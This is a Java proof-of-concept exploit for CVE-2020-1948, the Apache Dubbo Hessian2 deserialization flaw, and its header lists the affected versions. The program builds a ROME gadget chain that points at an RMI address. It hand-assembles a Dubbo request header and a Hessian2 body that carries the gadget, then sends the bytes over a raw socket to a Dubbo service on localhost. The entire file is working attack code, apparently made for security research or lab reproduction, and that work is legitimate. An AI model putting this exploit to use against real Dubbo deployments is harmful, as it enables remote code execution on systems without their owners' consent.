package org.example;

//import com.rometools.rome.feed.impl.EqualsBean;
//import com.rometools.rome.feed.impl.ToStringBean;
//import com.sun.syndication.feed.impl.EqualsBean;
//import com.sun.syndication.feed.impl.ToStringBean;

import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.Socket;

/**
 * @author Whoopsunix
 *
 * CVE-2020-1948
 *
 * 2.5.x、[2.6.0, 2.6.7]、[2.7.0, 2.7.6]、2.7.7
 * 构建 Socket 后续都是此方式的利用
 */
@EnableAutoConfiguration
public class CVE_2020_1948_2 {
    public static void main(String[] args) throws Exception {
        Object gadget = GadgetBuilder.romePayload("rmi://127.0.0.1:1099/ruzcoc");

        // HEADER
        byte[] header = new byte[16];

        // SET MAGIC NUMBER
        Bytes.short2bytes((short) 0xdabb, header);

        // HESSIAN SERIALIZED RESPONSE
        header[2] = (byte) ((byte) 0x80 | 2);

        // NOK RESPONSE STATUS
//        header[3] = (byte) 0;

        // ID
        Bytes.long2bytes(666, header, 4);

        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);

        // 1.dubboVersion
        out.writeUTF("2.7.5");
        // 2.path
        out.writeUTF("org.example.api.DemoService");
        // 3.version
        out.writeUTF("1.0");
        // 4.methodName
        out.writeUTF("sayObject");
        // 5.methodDesc
        out.writeUTF("Ljava/lang/Object;");
        out.writeObject(gadget);
        out.writeObject(new String[]{"java.lang.String"});


        out.flushBuffer();


        // 发送请求
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();

        Socket socket = new Socket("127.0.0.1", 12345);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }
}
